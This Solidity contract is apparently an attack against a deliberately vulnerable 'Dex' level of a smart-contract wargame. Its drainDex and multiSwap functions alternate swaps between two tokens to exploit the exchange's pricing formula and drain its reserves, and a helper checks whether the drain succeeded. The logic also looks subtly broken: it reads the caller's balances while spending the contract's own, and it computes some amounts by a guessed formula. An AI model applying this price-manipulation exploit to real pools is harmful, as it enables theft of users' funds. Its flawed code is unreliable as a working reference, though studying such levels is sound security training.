// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Dex.sol";

contract SimpleAttack {
    Dex public dex;
    address public token1;
    address public token2;
    
    constructor(address _dex) {
        dex = Dex(_dex);
    }
    
    // Manual swap function to drain the DEX
    function drainDex() external {
        // Get token addresses
        token1 = dex.token1();
        token2 = dex.token2();
        
        require(token1 != address(0) && token2 != address(0), "Tokens not set");
        
        // Approve DEX to spend our tokens
        dex.approve(address(dex), type(uint256).max);
        
        // Start swapping - we'll alternate between token1 and token2
        // The pricing formula will allow us to drain the DEX
        
        // First, let's check our initial balances
        uint256 myToken1 = dex.balanceOf(token1, msg.sender);
        uint256 myToken2 = dex.balanceOf(token2, msg.sender);
        
        // Swap all token1 for token2
        if (myToken1 > 0) {
            uint256 dexToken1 = dex.balanceOf(token1, address(dex));
            uint256 dexToken2 = dex.balanceOf(token2, address(dex));
            
            // Calculate how much we'll get
            uint256 swapAmount = myToken1;
            uint256 expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
            
            // If we would get more than what's in the DEX, adjust
            if (expectedReturn > dexToken2) {
                swapAmount = dexToken1;
            }
            
            dex.swap(token1, token2, swapAmount);
        }
        
        // Now swap token2 for token1
        myToken2 = dex.balanceOf(token2, msg.sender);
        if (myToken2 > 0) {
            uint256 dexToken1 = dex.balanceOf(token1, address(dex));
            uint256 dexToken2 = dex.balanceOf(token2, address(dex));
            
            uint256 swapAmount = myToken2;
            uint256 expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
            
            if (expectedReturn > dexToken1) {
                swapAmount = dexToken2;
            }
            
            dex.swap(token2, token1, swapAmount);
        }
    }
    
    // Helper to check if we've drained the DEX
    function checkDrained() external view returns (bool, uint256, uint256) {
        if (token1 == address(0) || token2 == address(0)) {
            return (false, 0, 0);
        }
        
        uint256 dexToken1 = dex.balanceOf(token1, address(dex));
        uint256 dexToken2 = dex.balanceOf(token2, address(dex));
        
        return (dexToken1 == 0 || dexToken2 == 0, dexToken1, dexToken2);
    }
    
    // Perform multiple swaps in sequence
    function multiSwap(uint256 iterations) external {
        token1 = dex.token1();
        token2 = dex.token2();
        
        require(token1 != address(0) && token2 != address(0), "Tokens not set");
        
        dex.approve(address(dex), type(uint256).max);
        
        for (uint256 i = 0; i < iterations; i++) {
            uint256 dexToken1 = dex.balanceOf(token1, address(dex));
            uint256 dexToken2 = dex.balanceOf(token2, address(dex));
            
            // Check if DEX is drained
            if (dexToken1 == 0 || dexToken2 == 0) {
                break;
            }
            
            if (i % 2 == 0) {
                // Swap token1 for token2
                uint256 myToken1 = dex.balanceOf(token1, msg.sender);
                if (myToken1 > 0) {
                    uint256 swapAmount = myToken1;
                    uint256 expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
                    
                    if (expectedReturn >= dexToken2) {
                        // Calculate exact amount to drain token2
                        swapAmount = dexToken1;
                        expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
                        if (expectedReturn > dexToken2) {
                            // Use binary search or calculate exact amount
                            swapAmount = (dexToken1 * dexToken2) / (dexToken2 + 1);
                        }
                    }
                    
                    if (swapAmount > 0 && swapAmount <= myToken1) {
                        dex.swap(token1, token2, swapAmount);
                    }
                }
            } else {
                // Swap token2 for token1
                uint256 myToken2 = dex.balanceOf(token2, msg.sender);
                if (myToken2 > 0) {
                    uint256 swapAmount = myToken2;
                    uint256 expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
                    
                    if (expectedReturn >= dexToken1) {
                        swapAmount = dexToken2;
                        expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
                        if (expectedReturn > dexToken1) {
                            swapAmount = (dexToken2 * dexToken1) / (dexToken1 + 1);
                        }
                    }
                    
                    if (swapAmount > 0 && swapAmount <= myToken2) {
                        dex.swap(token2, token1, swapAmount);
                    }
                }
            }
        }
    }
}